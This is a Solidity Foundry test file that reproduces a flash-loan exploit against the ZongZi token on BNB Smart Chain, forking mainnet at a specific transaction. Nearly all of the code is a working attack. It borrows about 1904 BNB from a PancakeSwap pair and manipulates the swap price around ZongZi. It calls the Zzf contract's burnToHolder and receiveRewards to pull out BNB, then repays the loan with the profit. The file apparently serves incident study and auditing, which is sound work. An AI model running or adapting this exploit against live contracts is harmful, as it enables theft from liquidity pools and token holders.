// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";

import "./IZongZi.sol";
import "./IZZF.sol";

IZongZi constant ZongZi = IZongZi(
    payable(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68)
);
IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant BNB_ZongZi_Pool = IPancakePairV2(
    0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe
);
IPancakePairV2 constant USDT_BNB_V2_Pool = IPancakePairV2(
    0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
);
WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IZzf constant Zzf = IZzf(payable(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b));

contract ZongZiTest is Test {
    ZongZiUtils utils;
    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    function setUp() public {
        vm.createSelectFork(
            "bsc",
            hex"247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f"
        );

        utils = new ZongZiUtils();
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // BNB.balanceOf(address(BNB_ZongZi_Pool));

        print("WBNB balance before", BNB.balanceOf(address(this)), 18);

        USDT_BNB_V2_Pool.swap(
            0,
            1904.347826086956521739 ether,
            address(this),
            new bytes(1)
        );

        print("WBNB balance after", BNB.balanceOf(address(this)), 18);
    }

    function pancakeCall(
        address /* sender */,
        uint256 /* amount0 */,
        uint256 amount1,
        bytes calldata /* data */
    ) public {
        ZongZi.approve(address(PancakeV2Router), type(uint256).max);

        BNB.transfer(address(utils), BNB.balanceOf(address(this)));
        utils.fuckyou();

        // uint256 balance1 = BNB.balanceOf(address(this));
        // print("BNB", balance1, 18);
        // ZongZi -> 387 BNB
        token2token(
            address(ZongZi),
            address(BNB),
            ZongZi.balanceOf(address(this))
        );
        // print("BNB", BNB.balanceOf(address(this)) - balance1, 18);

        // Fee 4.77 BNB
        uint256 fee = (amount1 * swapFeeBase) / (swapFeeTotal - swapFeeBase);
        BNB.transfer(address(USDT_BNB_V2_Pool), amount1 + fee + 1);
    }

    function token2token(
        address token1,
        address token2,
        uint256 amountIn
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);

        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}

contract ZongZiUtils is Test {
    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function fuckyou() public {
        BNB.approve(address(PancakeV2Router), type(uint256).max);
        ZongZi.approve(address(PancakeV2Router), type(uint256).max);

        // 1904 BNB -> Zongzi
        token2token(
            address(BNB),
            address(ZongZi),
            BNB.balanceOf(address(this))
        );
        // 1885848504605732 ether
        // print("ZongZi", ZongZi.balanceOf(address(this)), 18);

        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(BNB);
        uint256[] memory amounts = PancakeV2Router.getAmountsIn(
            // 1296 ether
            address(ZongZi).balance - 1000000000,
            path
        );
        // print("amounts[0]", amounts[0], 18);
        // amounts[0]: 1020852908673228
        Zzf.burnToHolder(amounts[0], msg.sender);
        // +1296 ether BNB
        Zzf.receiveRewards(address(this));

        // 剩余ZongZi
        // 864995595932504 ether Zongzi -> 864 BNB
        token2token(
            address(ZongZi),
            address(BNB),
            ZongZi.balanceOf(address(this))
        );

        BNB.deposit{value: address(this).balance}();
        BNB.transfer(msg.sender, BNB.balanceOf(address(this)));
    }

    function token2token(
        address token1,
        address token2,
        uint256 amountIn
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);

        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
